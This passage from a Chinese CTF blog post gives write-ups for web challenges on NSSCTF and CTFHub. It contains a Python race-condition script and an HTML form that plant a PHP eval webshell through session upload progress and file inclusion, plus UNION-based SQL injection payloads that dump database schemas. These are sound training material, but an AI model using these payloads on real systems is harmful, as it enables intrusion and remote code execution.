class="number">200</span>:</span><br><span class="line">           <span class="keyword">print</span>(<span class="string">&quot;成功写入一句话！&quot;</span>)</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">print</span>(<span class="string">&quot;Retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   evnet = threading.<span class="title function_ invoke__">Event</span>()</span><br><span class="line">   with requests.<span class="title function_ invoke__">session</span>() <span class="keyword">as</span> session:</span><br><span class="line">       <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">5</span>):</span><br><span class="line">           threading.<span class="title function_ invoke__">Thread</span>(target=write, args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line">       <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">5</span>):</span><br><span class="line">           threading.<span class="title function_ invoke__">Thread</span>(target=read, args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line">   evnet.<span class="title function_ invoke__">set</span>()</span><br></pre></td></tr></table></figure>

<p>另外一种就用burp抓包了，手动访问了</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>hakaiisu<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://challenge-41a945986720d0e4.sandbox.ctfhub.com:10800/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><span class="comment">&lt;!-- 	</span></span><br><span class="line"><span class="comment">不对字符编码--&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span> /&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;go&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意要添加cookie</p>
<h1 id="第五空间-2021-EasyCleanup"><a href="#第五空间-2021-EasyCleanup" class="headerlink" title="[第五空间 2021]EasyCleanup"></a>[第五空间 2021]EasyCleanup</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123; </span><br><span class="line">    <span class="variable">$shell</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] : <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; </span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123; </span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>题目给出了源码,分析这道题能干嘛,能利用的函数有eval()和include()</p>
<p>更进eval 怎么利用的要传参数shell,但是这里(strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)，长度限制了,并且过滤了一下字符,数字加字母最多就8个字符，明显走不通,但是能利用这里phpinfo();</p>
<p>更进include 因为有个include函数,可以利用临时文件,日志文件来包含,但是日志文件长度不够,想着临时文件包含,看php版本发现是5.5&gt;5.4,且<strong>session.upload_progress.enabled</strong>开了的,所以利用脚本获取flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading  <span class="comment"># 多线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cffi.backend_ctypes <span class="keyword">import</span> xrange</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;http://node4.anna.nssctf.cn:28176/&#x27;</span></span><br><span class="line">file = <span class="string">&#x27;ph0ebus.txt&#x27;</span>  <span class="comment"># 上传文件名</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)  <span class="comment"># 文件内容，插入大量垃圾字符来使返回的时间更久，这样临时文件保存的时间更长</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.post(target, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                     files=&#123;<span class="string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>?mode=foo&amp;file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]retry&quot;</span>)</span><br><span class="line">            <span class="comment"># print(resp.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):  <span class="comment"># 每次调用返回其中的一个值，内存空间使用极少，因而性能非常好</span></span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">            <span class="comment"># target：在run方法中调用的可调用对象，即需要开启线程的可调用对象，比如函数或方法；args：在参数target中传入的可调用对象的参数元组，默认为空元组()</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="LitCTF-2023-这是什么？SQL-！注一下"><a href="#LitCTF-2023-这是什么？SQL-！注一下" class="headerlink" title="[LitCTF 2023]这是什么？SQL ！注一下"></a>[LitCTF 2023]这是什么？SQL ！注一下</h1><p>这道题,发现用打比赛写文件方法不行,发现过滤了&lt;?,估计是比赛的非预期解吧<br>题目给出了查询语句,所以可以直接sql注入</p>
<p>尝试了1))))) or 1&#x3D;1#把这个表数据爆完了发现了彩蛋的flag</p>
<p>没有正经的flag了,那估计再其他数据库里面了,通过联合注入，查询所有数据库，再查表查数据就行了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> schema_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.schemata#</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span>#</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> <span class="operator">=</span><span class="string">&#x27;ctftraining&#x27;</span>#</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>)))))) <span class="keyword">union</span> <span class="keyword">select</span> flag,<span class="number">2</span> <span class="keyword">from</span> ctftraining.flag</span><br></pre></td></tr></table></figure>

<h1 id="陇剑杯-2021-jwt"><a href="#陇剑杯-2021-jwt" class="headerlink" title="[陇剑杯 2021]jwt"></a>[陇剑杯 2021]jwt</h1><p>都是简单的流量分析,你一看就会</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/web/" rel="tag"># web</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/06/20/jwt/" rel="prev" title="jwt攻击">
                  <i class="fa fa-angle-left"></i> jwt攻击
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/06/24/6.24/" rel="next" title="6.24ctf+无参数rce">
                  6.24ctf+无参数rce <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">baicany</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  





<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right"},"mobile":{"show":true}});</script></body>
</html>
